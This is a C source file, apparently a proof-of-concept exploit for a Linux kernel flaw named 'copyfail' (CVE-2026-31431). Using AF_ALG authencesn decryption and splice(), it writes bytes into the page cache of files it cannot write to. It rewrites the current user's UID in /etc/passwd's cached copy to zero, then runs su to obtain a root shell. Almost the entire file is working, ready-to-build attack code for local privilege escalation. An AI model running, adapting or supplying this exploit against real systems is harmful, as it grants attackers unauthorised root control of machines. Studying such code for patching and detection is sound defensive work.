/*
 * copyfail – CVE-2026-31431 page-cache write without write permission
 *
 * Root cause: the authencesn AEAD template writes a 4-byte ESN (Extended
 * Sequence Number) past the end of its output scatter-list.  When the output
 * is backed by splice'd page-cache pages, those bytes are written to the page
 * cache without requiring write permission.
 *
 * Exploitation path (implemented here):
 *   1. Verify the primitive: write "XXXX" into a read-only temp file's cache.
 *   2. Locate the current user's UID field in /etc/passwd and flip it to "0".
 *   3. exec `su <user>` – su reads the poisoned cache, treats the user as
 *      uid=0, and hands us a root shell.  The on-disk /etc/passwd is untouched.
 *
 * Attack surface: AF_ALG socket family, AEAD mode.
 * Required config: see pocs/copyfail/kernel.config
 *
 * Usage: make poc POC=pocs/copyfail/poc.c
 */
#define _GNU_SOURCE
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <pwd.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <unistd.h>

#define info(fmt, ...) fprintf(stdout, "[*] " fmt "\n", ##__VA_ARGS__)
#define ok(fmt, ...)   fprintf(stdout, "[+] " fmt "\n", ##__VA_ARGS__)
#define err(fmt, ...)  fprintf(stderr, "[-] " fmt "\n", ##__VA_ARGS__)
#define die(fmt, ...)  do { err(fmt, ##__VA_ARGS__); exit(EXIT_FAILURE); } while (0)

/* ── AF_ALG constants ────────────────────────────────────────────────────── */
#ifndef AF_ALG
# define AF_ALG  38
#endif
#ifndef SOL_ALG
# define SOL_ALG 279
#endif

/* setsockopt optnames (SOL_ALG level) */
#define ALG_SET_KEY            1
#define ALG_SET_AEAD_AUTHSIZE  5

/* sendmsg cmsg types */
#define ALG_SET_IV             2
#define ALG_SET_OP             3
#define ALG_SET_AEAD_ASSOCLEN  4

/* operation values */
#define ALG_OP_DECRYPT         0

struct sockaddr_alg {
    uint16_t salg_family;
    uint8_t  salg_type[14];
    uint32_t salg_feat;
    uint32_t salg_mask;
    uint8_t  salg_name[64];
};

/* struct af_alg_iv from linux/if_alg.h */
struct af_alg_iv {
    uint32_t ivlen;
    uint8_t  iv[0];
};

/*
 * Authenc key blob (rtnetlink-style attribute):
 *   [u16 rta_len=8][u16 rta_type=1][__be32 enckeylen=16][32 bytes key]
 * The key value is irrelevant – we only need setkey() to succeed.
 */
static const uint8_t AUTHENC_KEY[8 + 32] = {
#if __BYTE_ORDER == __LITTLE_ENDIAN
    0x08, 0x00, 0x01, 0x00,
#else
    0x00, 0x08, 0x00, 0x01,
#endif
    0x00, 0x00, 0x00, 0x10,
    /* 32 zero bytes follow (default-initialized) */
};

/* ── Core write primitive ────────────────────────────────────────────────── */
/*
 * Writes exactly 4 bytes into fd's page cache at byte offset `off`,
 * without requiring write permission on the file.
 *
 * Mechanism: one bogus AEAD-decrypt via AF_ALG whose ciphertext is supplied
 * by splice()'ing from the target file's page cache.  authencesn's in-place
 * optimization reuses the splice'd source pages as the (failed) decrypt's
 * destination, so the 4 payload bytes have already been written to the cache
 * by the time authentication rejects the operation.
 */
static int patch_chunk(int fd, off_t off, const uint8_t four[4])
{
    int ctrl = -1, op = -1;
    int pfd[2] = { -1, -1 };
    int rc = -1;

    ctrl = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (ctrl < 0) { perror("socket(AF_ALG)"); goto out; }

    struct sockaddr_alg sa = { .salg_family = AF_ALG };
    memcpy(sa.salg_type, "aead", 5);
    memcpy(sa.salg_name, "authencesn(hmac(sha256),cbc(aes))",
           sizeof "authencesn(hmac(sha256),cbc(aes))");

    if (bind(ctrl, (struct sockaddr *)&sa, sizeof sa) < 0) {
        perror("bind(AF_ALG: authencesn(hmac(sha256),cbc(aes)))"); goto out;
    }
    if (setsockopt(ctrl, SOL_ALG, ALG_SET_KEY,
                   AUTHENC_KEY, sizeof AUTHENC_KEY) < 0) {
        perror("setsockopt(ALG_SET_KEY)"); goto out;
    }
    if (setsockopt(ctrl, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL, 4) < 0) {
        perror("setsockopt(ALG_SET_AEAD_AUTHSIZE)"); goto out;
    }

    op = accept(ctrl, NULL, 0);
    if (op < 0) { perror("accept(AF_ALG)"); goto out; }

    /* AAD: 4 dummy bytes + 4-byte payload.
     * The authencesn template writes the ESN (= our four bytes) at `off`
     * in the page-cache pages that were splice'd in below. */
    uint8_t aad[8] = { 'A','A','A','A', four[0], four[1], four[2], four[3] };
    struct iovec iov = { .iov_base = aad, .iov_len = sizeof aad };

    union {
        struct cmsghdr align;
        uint8_t buf[
            CMSG_SPACE(sizeof(uint32_t)) +
            CMSG_SPACE(sizeof(struct af_alg_iv) + 16) +
            CMSG_SPACE(sizeof(uint32_t))
        ];
    } cbuf;
    memset(&cbuf, 0, sizeof cbuf);

    struct msghdr msg = {
        .msg_iov        = &iov,
        .msg_iovlen     = 1,
        .msg_control    = cbuf.buf,
        .msg_controllen = sizeof cbuf.buf,
    };

    struct cmsghdr *cm = CMSG_FIRSTHDR(&msg);
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type  = ALG_SET_OP;
    cm->cmsg_len   = CMSG_LEN(sizeof(uint32_t));
    *(uint32_t *)CMSG_DATA(cm) = ALG_OP_DECRYPT;

    cm = CMSG_NXTHDR(&msg, cm);
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type  = ALG_SET_IV;
    cm->cmsg_len   = CMSG_LEN(sizeof(struct af_alg_iv) + 16);
    struct af_alg_iv *aiv = (struct af_alg_iv *)CMSG_DATA(cm);
    aiv->ivlen = 16;
    memset(aiv->iv, 0, 16);

    cm = CMSG_NXTHDR(&msg, cm);
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type  = ALG_SET_AEAD_ASSOCLEN;
    cm->cmsg_len   = CMSG_LEN(sizeof(uint32_t));
    *(uint32_t *)CMSG_DATA(cm) = 8;

    if (sendmsg(op, &msg, MSG_MORE) < 0) {
        perror("sendmsg(AAD)"); goto out;
    }

    if (pipe(pfd) < 0) { perror("pipe"); goto out; }

    size_t splice_len = (size_t)off + 4;
    off_t src_off = 0;
    if (splice(fd, &src_off, pfd[1], NULL, splice_len, 0) < 0) {
        perror("splice(file→pipe)"); goto out;
    }
    if (splice(pfd[0], NULL, op, NULL, splice_len, 0) < 0) {
        perror("splice(pipe→op)"); goto out;
    }

    /* recv() triggers the in-kernel decrypt; the ESN write has already fired */
    uint8_t *sink = malloc(8 + (size_t)off);
    if (sink) {
        (void)recv(op, sink, 8 + (size_t)off, 0);
        free(sink);
    }

    rc = 0;
out:
    if (pfd[0] >= 0) close(pfd[0]);
    if (pfd[1] >= 0) close(pfd[1]);
    if (op   >= 0)   close(op);
    if (ctrl >= 0)   close(ctrl);
    return rc;
}

/* ── /etc/passwd UID field locator ───────────────────────────────────────── */
/* Returns the byte offset of the UID field for `username` in /etc/passwd. */
static off_t find_uid_offset(const char *username)
{
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) { perror("open(/etc/passwd)"); return -1; }

    char buf[65536];
    ssize_t n = read(fd, buf, sizeof buf - 1);
    close(fd);
    if (n <= 0) { perror("read(/etc/passwd)"); return -1; }
    buf[n] = '\0';

    size_t namelen = strlen(username);
    char *line = buf;
    while (line < buf + n) {
        char *eol = memchr(line, '\n', (size_t)((buf + n) - line));
        size_t linelen = eol ? (size_t)(eol - line) : (size_t)((buf + n) - line);

        if (linelen > namelen + 1 &&
            memcmp(line, username, namelen) == 0 &&
            line[namelen] == ':') {
            /* name:x:UID:GID:... – skip two colons to reach UID field */
            char *c1 = memchr(line,      ':', linelen);
            if (!c1) break;
            char *c2 = memchr(c1 + 1, ':', linelen - (size_t)(c1 + 1 - line));
            if (!c2) break;
            return (off_t)((c2 + 1) - buf);
        }
        if (!eol) break;
        line = eol + 1;
    }

    err("user '%s' not found in /etc/passwd", username);
    return -1;
}

/* ── Exploit ─────────────────────────────────────────────────────────────── */
static void exploit(const char *username, uid_t uid)
{
    struct utsname u;
    uname(&u);
    info("Kernel : %s %s %s", u.sysname, u.release, u.machine);
    info("PoC    : copyfail – CVE-2026-31431 page-cache write w/o write perm");
    info("User   : %s  uid=%u", username, uid);

    /* ── Step 1: verify the primitive with a temp file ── */
    const char *tmppath = "/tmp/copyfail_target";
    uint8_t orig[8];
    memset(orig, 'A', sizeof orig);

    int wfd = open(tmppath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (wfd < 0) die("open(O_WRONLY): %s", strerror(errno));
    if (write(wfd, orig, sizeof orig) != (ssize_t)sizeof orig)
        die("write: %s", strerror(errno));
    close(wfd);
    chmod(tmppath, 0444);

    int rfd = open(tmppath, O_RDONLY);
    if (rfd < 0) die("open(O_RDONLY): %s", strerror(errno));

    info("Before : first 8 bytes of read-only file = \"%.8s\"", orig);
    info("Writing \"XXXX\" at offset 0 via authencesn ESN out-of-bounds ...");

    const uint8_t marker[4] = { 'X', 'X', 'X', 'X' };
    if (patch_chunk(rfd, 0, marker) < 0)
        die("patch_chunk failed – check CONFIG_CRYPTO_USER_API_AEAD=y and CONFIG_CRYPTO_AUTHENCESN=y");
    close(rfd);

    uint8_t after[8] = {0};
    int vfd = open(tmppath, O_RDONLY);
    if (vfd >= 0) { (void)read(vfd, after, sizeof after); close(vfd); }

    info("After  : first 8 bytes = \"%.8s\"", after);
    if (memcmp(after, "XXXX", 4) != 0)
        die("page cache unchanged – kernel may be patched or AF_ALG AEAD unavailable");

    ok("Primitive verified: wrote to read-only page cache without write permission");

    /* ── Step 2: locate UID field in /etc/passwd ── */
    off_t uid_off = find_uid_offset(username);
    if (uid_off < 0)
        die("cannot locate UID field in /etc/passwd");

    ok("/etc/passwd UID field at offset %lld", (long long)uid_off);

    char fieldbuf[12] = {0};
    {
        int pfd = open("/etc/passwd", O_RDONLY);
        if (pfd < 0) die("open(/etc/passwd): %s", strerror(errno));
        (void)pread(pfd, fieldbuf, sizeof fieldbuf - 1, uid_off);
        close(pfd);
    }

    int field_len = 0;
    while (field_len < (int)(sizeof fieldbuf - 1) && fieldbuf[field_len] != ':')
        field_len++;
    if (field_len == 0 || field_len > 10)
        die("unexpected UID field length %d", field_len);

    /* Same width, all zeros – /etc/passwd treats leading zeros as decimal */
    char padded[11];
    memset(padded, '0', field_len);
    padded[field_len] = '\0';

    ok("Patching UID: \"%.*s\" → \"%s\" (page cache only, disk untouched)",
       field_len, fieldbuf, padded);

    /* ── Step 3: flip UID field in /etc/passwd page cache ── */
    int passwdfd = open("/etc/passwd", O_RDONLY);
    if (passwdfd < 0) die("open(/etc/passwd): %s", strerror(errno));

    for (int off = 0; off < field_len; off += 4) {
        uint8_t chunk[4] = {0};
        int take = (field_len - off < 4) ? (field_len - off) : 4;
        if (take < 4) {
            /* read-modify for the last partial window */
            if (pread(passwdfd, chunk, 4, uid_off + off) < 0)
                die("pread: %s", strerror(errno));
        }
        memcpy(chunk, padded + off, (size_t)take);
        if (patch_chunk(passwdfd, uid_off + off, chunk) < 0)
            die("patch_chunk failed at offset %d", off);
    }
    close(passwdfd);

    ok("/etc/passwd page cache mutated – '%s' now appears as uid=0", username);
    ok("Exec'ing `su %s` to cash out ...", username);
    info("(Run `echo 3 > /proc/sys/vm/drop_caches` as root to restore)");

    /* ── Step 4: cash out via su ── */
    execlp("su", "su", username, (char *)NULL);
    perror("execlp(su)");
    exit(1);
}

int main(void)
{
    uid_t uid = getuid();
    struct passwd *pw = getpwuid(uid);
    if (!pw) die("getpwuid: %s", strerror(errno));

    info("copyfail  pid=%d  user=%s  uid=%d", getpid(), pw->pw_name, uid);

    if (uid == 0) {
        info("Already root.");
        return 0;
    }

    exploit(pw->pw_name, uid);
    return 0;
}
